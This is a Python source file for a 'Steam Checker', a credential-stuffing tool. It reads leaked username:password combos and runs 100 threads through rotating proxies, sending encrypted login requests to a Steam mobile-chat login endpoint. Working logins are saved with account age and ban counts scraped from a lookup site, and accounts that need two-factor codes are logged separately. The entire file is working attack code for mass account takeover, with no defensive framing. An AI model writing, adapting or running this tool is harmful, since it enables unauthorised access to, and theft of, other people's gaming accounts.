import os
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
import time
import random
import concurrent.futures
import threading
from colorama import Fore, Style, init
from pystyle import Center
import json
from bs4 import BeautifulSoup
from datetime import datetime
from pyfiglet import figlet_format

# checker stats
class Stats:
    def __init__(self):
        self.total = 0
        self.hits = 0
        self.twofa = 0
        self.bad = 0

    def update(self, result):
        if result == "hit":
            self.hits += 1
        elif result == "2fa":
            self.twofa += 1
        elif result == "bad":
            self.bad += 1

# proxy manager
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_list = self.load_proxies(proxy_file)

    def load_proxies(self, proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as file:
            proxies_list = file.readlines()
        return [proxy.strip() for proxy in proxies_list]
    
    def get_random_proxy(self):
        return random.choice(self.proxy_list)
    
# steam checker
class Checker:
    def __init__(self, output_directory):
        self.session = requests.Session()
        self.output_directory = output_directory
        self.stats = Stats()
        self.proxy_manager = ProxyManager("proxies.txt")

    def valid_log(self, user, password, steamid):
        try:
            response = self.session.get(f"https://findsteamid.com/steamid/{steamid}")
            soup = BeautifulSoup(response.text, "html.parser")
            account_created = soup.find("div", string="Account Created").find_next_sibling("div").get_text(strip=True)
            num_of_vac_bans = soup.find("div", string="Number of VAC Bans").find_next_sibling("div").get_text(strip=True)
            num_of_game_bans = soup.find("div", string="Number of Game Bans").find_next_sibling("div").get_text(strip=True)
            num_of_bans = int(num_of_vac_bans) + int(num_of_game_bans)

            with open(f"{self.output_directory}/hits.txt", "a", encoding="utf-8") as valid_file:
                valid_file.write(f"Login: {user}:{password} | Created: {account_created} | Number Of Bans: {num_of_bans}\n")
        except Exception:
            with open(f"{self.output_directory}/hits.txt", "a", encoding="utf-8") as valid_file:
                valid_file.write(f"Login: {user}:{password} | Created: Couldnt Fetch | Number Of Bans: Couldnt Fetch\n")

    def check(self, combo):
        user, password = combo.strip().split(":")

        while True:
            try:
                proxy = self.proxy_manager.get_random_proxy()
                proxies = {
                    "http": "http://" + proxy,
                    "https": "http://" + proxy,
                }
                values = {
                    "username": user,
                    "donotcache": str(int(time.time() * 1000)),
                }
                headers = {
                    "Host": "steam-chat.com",
                    "User-Agent": "okhttp/4.9.2",
                    "Device": "f5bf4f66306d8cf2cb95d342c02a5941",
                    "Connection": "keep-alive",
                }
                response = self.session.post("https://steam-chat.com/login/getrsakey/", data=values, headers=headers, proxies=proxies)
                data = response.json()
                if not data.get("success"):
                    return
                
                mod = int(data["publickey_mod"], 16)
                exp = int(data["publickey_exp"], 16)
                rsa = RSA.construct((mod, exp))
                cipher = PKCS1_v1_5.new(rsa)
                encrypted_password = base64.b64encode(cipher.encrypt(password.encode())).decode()
                values2 = {
                    "username": user,
                    "password": encrypted_password,
                    "emailauth": "",
                    "loginfriendlyname": "",
                    "captchagid": "",
                    "captcha_text": "",
                    "emailsteamid": "",
                    "rsatimestamp": data["timestamp"],
                    "remember_login": False,
                    "oauth_client_id": "C1F110D6",
                    "mobile_chat_client": True,
                    "donotcache": str(int(time.time() * 1000)),
                }
                headers2 = {
                    "Host": "steam-chat.com",
                    "User-Agent": "okhttp/4.9.2",
                    "Device": "f5bf4f66306d8cf2cb95d342c02a5941",
                    "Connection": "keep-alive",
                }
                response2 = self.session.post("https://steam-chat.com/login/dologin/", data=values2, headers=headers2, proxies=proxies)
                data2 = response2.json()
                if data2["success"] == True:
                    self.stats.update("hit")
                    oauth_data = json.loads(data2["oauth"])
                    steamid = oauth_data["steamid"]
                    self.valid_log(user, password, steamid)

                    break
                else:
                    if data2["requires_twofactor"] == True:
                        self.stats.update("2fa")
                        with open(f"{self.output_directory}/2fa.txt", "a", encoding="utf-8") as twofa_file:
                            twofa_file.write(f"{user}:{password}\n")
                    else:
                        self.stats.update("bad")
                        with open(f"{self.output_directory}/bad.txt", "a", encoding="utf-8") as bad_file:
                            bad_file.write(f"{user}:{password}\n")
                            
                    break
            except Exception:
                continue

    def progress_bar(self, progress, total, bar_width=20):
        percent = 100 * (progress / float(total))
        filled_length = int(bar_width * percent // 100)
        bar = "█" * filled_length + "-" * (bar_width - filled_length)

        print(Center.XCenter(f"|{bar}| {percent:.2f}%"))

    def update_data(self):
        while True:
            time.sleep(1)
            os.system("cls")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
            print(Center.XCenter(f"{Fore.MAGENTA}{figlet_format("Steam Checker")}{Style.RESET_ALL}"))
            print("")
            print(Center.XCenter("=================================================="))
            self.progress_bar(self.stats.hits + self.stats.twofa + self.stats.bad, self.stats.total)
            print(Center.XCenter(f"Hits - {Fore.GREEN}<<{self.stats.hits}>>{Style.RESET_ALL}"))
            print(Center.XCenter(f"2FA - {Fore.YELLOW}<<{self.stats.twofa}>>{Style.RESET_ALL}"))
            print(Center.XCenter(f"Bad - {Fore.RED}<<{self.stats.bad}>>{Style.RESET_ALL}"))
            print(Center.XCenter("=================================================="))

    def run(self, combos):
        self.stats.total = len(combos)

        threading.Thread(target=self.update_data, daemon=False).start()

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(self.check, combos)

# main
class Main:
    @staticmethod
    def create_output_directory():
        output_dir = f"output/{datetime.now().strftime("%m-%d-%Y_%H-%M-%S")}"
        os.makedirs(output_dir, exist_ok=True)

        return output_dir
    
    @staticmethod
    def load_combos(combo_file):
        with open(combo_file, "r", encoding="utf-8") as file:
            combos_list = file.readlines()
        
        without_removed = len(combos_list)
        combos_list = set([x for x in combos_list if x != "" and ":" in x])
        removed = without_removed - len(combos_list)

        print(f"{Fore.GREEN}Removed {removed} duplicates!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}About to check {len(combos_list)} lines!{Style.RESET_ALL}")

        return combos_list
    
    @staticmethod
    def main():
        init(autoreset=True)
        os.system("cls && title Steam Checker By @u8ej")
        
        output_directory = Main.create_output_directory()
        combos = Main.load_combos("combos.txt")

        checker = Checker(output_directory)
        checker.run(combos)

if __name__ == "__main__":
    Main.main()